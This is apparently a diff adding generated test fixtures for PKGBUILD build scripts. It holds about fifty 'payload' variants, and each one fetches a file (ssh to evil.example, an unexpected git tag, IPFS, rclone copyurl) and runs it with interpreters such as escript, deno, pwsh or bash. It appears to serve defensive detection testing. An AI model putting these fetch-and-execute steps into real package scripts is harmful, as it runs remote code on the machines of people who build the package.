@@ -1,0 +1,293 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        escript f.erl
+  id: 105-ssht-escript
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        fennel f.erl
+  id: 106-ssht-fennel
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        zx f.erl
+  id: 107-ssht-zx
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        guile f.erl
+  id: 108-ssht-guile
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        racket f.erl
+  id: 109-ssht-racket
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        deno f.erl
+  id: 110-ssht-deno
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        bun f.erl
+  id: 111-ssht-bun
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        elixir f.erl
+  id: 112-ssht-elixir
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        ts-node f.erl
+  id: 113-ssht-tsnode
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        pwsh < f.erl
+  id: 114-ssht-pwsh
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        julia < f.erl
+  id: 115-ssht-julia
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        Rscript < f.erl
+  id: 116-ssht-Rscript
+- vars:
+    payload: |2
+        ssh u@evil.example tar -C / -cf - f.erl | tar -xf -
+        for f in *.erl; do bash "$f"; done
+  id: 117-ssht-loop
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        escript f.erl
+  id: 118-gitf-escript
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        fennel f.erl
+  id: 119-gitf-fennel
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        zx f.erl
+  id: 120-gitf-zx
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        guile f.erl
+  id: 121-gitf-guile
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        racket f.erl
+  id: 122-gitf-racket
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        deno f.erl
+  id: 123-gitf-deno
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        bun f.erl
+  id: 124-gitf-bun
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        elixir f.erl
+  id: 125-gitf-elixir
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        ts-node f.erl
+  id: 126-gitf-tsnode
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        pwsh < f.erl
+  id: 127-gitf-pwsh
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        julia < f.erl
+  id: 128-gitf-julia
+- vars:
+    payload: |2
+        cd "$srcdir/harness-baseline-1.0.0"
+        git fetch origin tag v9.9.9
+        git checkout -q FETCH_HEAD
+        cd "$srcdir"
+        Rscript < f.erl
+  id: 129-gitf-Rscript
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        escript f.erl
+  id: 130-ipfs-escript
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        fennel f.erl
+  id: 131-ipfs-fennel
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        zx f.erl
+  id: 132-ipfs-zx
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        guile f.erl
+  id: 133-ipfs-guile
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        racket f.erl
+  id: 134-ipfs-racket
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        deno f.erl
+  id: 135-ipfs-deno
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        bun f.erl
+  id: 136-ipfs-bun
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        elixir f.erl
+  id: 137-ipfs-elixir
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        ts-node f.erl
+  id: 138-ipfs-tsnode
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        pwsh < f.erl
+  id: 139-ipfs-pwsh
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        julia < f.erl
+  id: 140-ipfs-julia
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        Rscript < f.erl
+  id: 141-ipfs-Rscript
+- vars:
+    payload: |2
+        ipfs cat QmPayload123 > f.erl
+        for f in *.erl; do bash "$f"; done
+  id: 142-ipfs-loop
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        escript f.erl
+  id: 143-rclone-escript
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        fennel f.erl
+  id: 144-rclone-fennel
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        zx f.erl
+  id: 145-rclone-zx
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        guile f.erl
+  id: 146-rclone-guile
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        racket f.erl
+  id: 147-rclone-racket
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        deno f.erl
+  id: 148-rclone-deno
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        bun f.erl
+  id: 149-rclone-bun
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        elixir f.erl
+  id: 150-rclone-elixir
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        ts-node f.erl
+  id: 151-rclone-tsnode
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        pwsh < f.erl
+  id: 152-rclone-pwsh
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        julia < f.erl
+  id: 153-rclone-julia
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        Rscript < f.erl
+  id: 154-rclone-Rscript
+- vars:
+    payload: |2
+        rclone copyurl "$(cat "$srcdir/url.txt")" f.erl
+        for f in *.erl; do bash "$f"; done
+  id: 155-rclone-loop
